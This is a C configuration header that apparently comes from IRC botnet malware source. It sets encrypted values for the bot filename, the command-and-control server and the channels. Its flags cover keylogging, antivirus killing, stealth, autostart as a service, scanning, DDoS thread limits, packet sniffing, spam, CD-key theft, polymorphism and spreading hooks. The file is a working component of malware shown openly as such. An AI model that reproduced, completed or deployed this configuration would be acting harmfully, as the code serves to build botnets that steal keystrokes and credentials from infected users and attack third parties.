#ifndef __CONFIG_H__
#define __CONFIG_H__

#include "confbase.h"

// The section name for polymorph
#define SECTION_NAME ".ntdtbfc"

// Array of CVars
conf_cvar g_aCVars[] = {
	{	"bot_filename",	"\xBA\xE8\x9D\xF7\xB0\x92\x4E\x15\x30\xBC",	"CHOrBYFFMmek5Efk",	"\x4F\xF4\xD1\x1B\x62\x42\xDB\x23\x43\x34\xFC\x6C\x0F\xE7\xAA\x2F"	},
	{	"bot_id",	"\x6D\x08\x2E\x29\x02\x98\x55\x68\x79\x7B",	"ovm21kIYRl60QD1C",	"\xD1\xDE\xE1\x30\x2A\x36\xB1\x87\x78\xBC\xF5\xF3\x2F\x50\x9F\x9E"	},
	{	"bot_prefix",	".",	NULL,	""	},
	{	"bot_timeout",	"73000",	NULL,	""	},
	{	"bot_seclogin",	"true",	NULL,	""	},
	{	"bot_compnick",	"false",	NULL,	""	},
	{	"bot_randnick",	"true",	NULL,	""	},
	{	"bot_meltserver",	"false",	NULL,	""	},
	{	"bot_topiccmd",	"false",	NULL,	""	},
	{	"do_speedtest",	"true",	NULL,	""	},
	{	"do_avkill",	"false",	NULL,	""	},
	{	"do_stealth",	"false",	NULL,	""	},
	{	"as_valname",	"",	"2866JPOOz485m64O",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"as_enabled",	"false",	NULL,	""	},
	{	"as_service",	"false",	NULL,	""	},
	{	"as_service_name",	"",	"R1PS9xJWSW2t7Cfz",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scan_maxthreads",	"200",	NULL,	""	},
	{	"scan_maxsockets",	"200",	NULL,	""	},
	{	"ddos_maxthreads",	"500",	NULL,	""	},
	{	"redir_maxthreads",	"100",	NULL,	""	},
	{	"identd_enabled",	"false",	NULL,	""	},
	{	"cdkey_windows",	"false",	NULL,	""	},
	{	"scaninfo_level",	"3",	NULL,	""	},
	{	"spam_aol_channel",	"",	"YL2D9v6GAZc1y0A0",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"spam_aol_enabled",	"false",	NULL,	""	},
	{	"sniffer_enabled",	"false",	NULL,	""	},
	{	"sniffer_channel",	"",	"2tveLzRu04WuPhXE",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"keylog_enabled",	"true",	NULL,	""	},
	{	"keylog_channel",	"\x7A\xEA\x5D\x6A\x48\xFD",	"uEdvh1DfXwLMbqEk",	"\xAB\xA8\x67\xC8\xE0\xE5\x02\x1A\x41\x97\x00\xA4\x76\x85\xCD\xA1"	},
	{	"scaninfo_chan",	"\xBF\x3D\x15\xAC\xD1\xBE",	"JA26Jje8KEfQqDtL",	"\x43\xA1\x7F\xE3\xBD\xEA\xA1\x84\x70\xA0\x6E\x15\x16\xFB\x9D\xE6"	},
	{	"inst_polymorph",	"false",	NULL,	""	},
	{	"vuln_channel",	"",	"YT7U4RFv4kvH4ZTR",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
};

// Array of Users
conf_user g_aUsers[] = {
{	{	"user0.username",	"\x49\xA0\xDD\xE0\xFC\x71",	"GxUL3Oxg5JOCI39Z",	"\x59\x87\x0B\x08\x57\x95\x27\x6A\xBB\x38\xA6\x25\xCE\xE2\x8A\xBA"	},
	{	"user0.password",	"098F6BCD4621D373CADE4E832627B4F6",	NULL,	"\x3A\x25\x1A\x4F\xB0\x00\x20\x8B\x8A\xE2\x78\x82\x2D\x2E\x23\x13"	},
	{	"user0.hostmask",	"\x49\xB9\x3A\xE3\x0C\x77\x09\x9E\x03\x9C\xD8\xFE",	"GxUL3Oxg5JOCI39Z",	"\x59\x3A\xC9\x82\xE1\xAD\xA1\x62\x75\x84\xCF\x9D\xA8\x50\x99\x8E"	},
	{	"user0.identdmask",	"\x58\x84\xAB\x0A",	"GxUL3Oxg5JOCI39Z",	"\x56\x17\xC7\xAD\x48\xAC\x5D\x05\xAC\x0D\xCF\x13\x81\xEB\xFA\xBF"	}, },
};

// Array of Servers
conf_server g_aServers[] = {
{	{	"server0.chanpass",	"",	"V3h45L3WJJFKsyes",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"server0.mainchan",	"\x6E\x6B\x9F\x3E\x24\xB4",	"V3h45L3WJJFKsyes",	"\xAD\xA9\xDA\xC4\x38\xEC\xDB\xA5\x82\x64\x37\xF9\x7A\x3B\x22\x14"	},
	{	"server0.nickprefix",	"\x16\x6B\x51",	"V3h45L3WJJFKsyes",	"\x52\xBB\x06\x1C\xC7\x7C\x2B\x11\x9C\x30\xF7\x60\xCF\xCE\xCA\x8E"	},
	{	"server0.port",	"6667",	NULL,	""	},
	{	"server0.server",	"\x61\xA4\x61\x1E\x8F\xBC\x87\x79\xDE\x48\x0D\x5B\x9F\x3A\xA3\xCD\x5E\xE7\xD7\xD7\x2A\xFF\xC7",	"VpeR5O0VVsZjC34W",	"\xE4\xEA\x44\x7B\xF6\x61\x40\x71\x4A\x8E\x25\x8C\x31\xA8\x25\xB7"	},
	{	"server0.servpass",	"",	"VpeR5O0VVsZjC34W",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"server0.usessl",	"false",	NULL,	""	}	},
};

// Script

char *g_szScript = \
	"onstart {\n" \
	"}\n" \
	"onconnect {\n" \
	"}\n" \
	"onjoin {\n" \
	"}\n" \
	"onlogin {\n" \
	"}\n" \
	"ondisconnect {\n" \
	"}\n" \
	"onremove {\n" \
	"}\n" \
	"onspread {\n" \
	"}\n" \
	"ondebugeractive {\n" \
	"}\n" \
	"ontimer 10080m {\n" \
	"}\n" \
	"onstartupfin {\n" \
	"}\n";

#endif // __CONFIG_H__
